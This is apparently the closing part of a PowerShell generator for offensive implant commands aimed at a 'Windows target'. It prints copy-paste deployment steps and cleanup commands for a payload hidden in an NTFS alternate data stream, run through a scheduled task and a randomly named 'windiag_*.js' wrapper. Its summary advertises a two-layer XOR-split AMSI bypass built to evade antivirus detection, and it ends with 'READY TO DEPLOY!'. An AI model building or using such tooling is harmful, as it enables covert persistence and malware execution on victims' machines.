1. Copy OPTION 1 or OPTION 2
2. Paste into PowerShell on Windows target
3. Press Enter
$(if ($PayloadAtDeployment) { "4. Enter payload when prompted`n5. Press Enter twice to finish" })

╔═══════════════════════════════════════════════════════════╗
║ CLEANUP (use codepoints from manifest)                   ║
╚═══════════════════════════════════════════════════════════╝

# Reconstruct stream name
`$sn=$($config.StreamNameEscaped)

# Remove ADS
Remove-Item "`$(`$hp)``:`$sn" -Force

# Remove task
Unregister-ScheduledTask -TaskName '$($config.TaskName)' -Confirm:`$false

# Remove host file
Remove-Item '$($config.HostPath)' -Force

# Remove JScript wrapper (pattern match — runtime filename is randomized)
`$_jsDir = Split-Path '$($config.HostPath)' -Parent
if (`$_jsDir) { Get-ChildItem -Path `$_jsDir -Filter "windiag_*.js" -EA 0 | Remove-Item -Force }

╔═══════════════════════════════════════════════════════════╝
"@

$outputContent | Out-File -FilePath $OutputFile -Encoding UTF8 -Force

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║ SUMMARY                                                   ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "✓ Minimal commands generated" -ForegroundColor Green
Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
if (-not $PayloadAtDeployment) {
    Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
}
if ($PayloadFile) {
    Write-Host "✓ Payload loaded from file (shell-safe)" -ForegroundColor Green
}
if (-not $NoAmsi) {
    Write-Host "✓ AMSI bypass: XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Green
    Write-Host "  - Layer A: deployment script (random XOR key per generation)" -ForegroundColor DarkGray
    Write-Host "  - Layer B: scheduled task execution (separate random key)" -ForegroundColor DarkGray
    Write-Host "  - Source text: only byte arrays + generic decode loop" -ForegroundColor DarkGray
    Write-Host "  - No .GetType/.GetField/.SetValue chain in source" -ForegroundColor DarkGray
}
Write-Host ""
Write-Host "READY TO DEPLOY!" -ForegroundColor Magenta
Write-Host "Copy-paste to Windows target and execute.`n" -ForegroundColor White
